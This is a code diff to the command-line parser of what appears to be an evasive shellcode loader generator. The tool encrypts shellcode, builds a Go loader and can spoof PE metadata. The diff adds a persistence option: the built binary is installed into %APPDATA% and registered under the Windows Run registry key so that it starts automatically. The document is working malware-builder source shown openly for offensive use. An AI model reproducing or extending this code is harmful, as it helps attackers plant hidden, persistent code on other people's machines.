@@ -129,7 +129,7 @@ func GetParser(opts *Options) *cobra.Command {
 			fmt.Printf("%s\n\n", ASCII_ART)
 
 			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
-			err := tools.CreateTmpProjectRoot(MYPH_TMP_DIR)
+			err := tools.CreateTmpProjectRoot(MYPH_TMP_DIR, opts.Persistence)
 			if err != nil {
 				fmt.Printf("[!] Error generating project root: %s\n", err)
 				os.Exit(1)
@@ -224,6 +224,21 @@ func GetParser(opts *Options) *cobra.Command {
 				panic(err)
 			}
 
+			persistData := ""
+			if opts.Persistence != "" {
+				persistData = fmt.Sprintf(`persistExecute("%s")`, opts.Persistence)
+				execCmd := exec.Command("go", "get", "golang.org/x/sys/windows/registry")
+				execCmd.Dir = MYPH_TMP_DIR
+				_, _ = execCmd.Output()
+
+				template = tools.GetPersistTemplate()
+				err = tools.WriteToFile(MYPH_TMP_DIR, "persist.go", template)
+				if err != nil {
+					panic(err)
+				}
+				fmt.Printf("\nUsing persistence technique, file will be installed to %%APPDATA%%\\%s\n", opts.Persistence)
+			}
+
 			/* write main execution template */
 			encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
 			encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
@@ -235,6 +250,7 @@ func GetParser(opts *Options) *cobra.Command {
 					encodedKey,
 					encodedShellcode,
 					opts.SleepTime,
+					persistData,
 					opts.BuildType == "dll",
 				),
 			)
@@ -297,7 +313,8 @@ func GetParser(opts *Options) *cobra.Command {
 	rootCmd.Flags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
 	rootCmd.Flags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
 	rootCmd.Flags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")
-
+  rootCmd.PersistentFlags().StringVarP(&opts.Persistence, "peristence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")
+  
 	spoofMetadata.Flags().StringVarP(&opts.PEFilePath, "pe", "p", defaults.PEFilePath, "PE file to spoof")
 	spoofMetadata.Flags().StringVarP(&opts.VersionFilePath, "file", "f", defaults.VersionFilePath, "manifest file path (as JSON)")
 
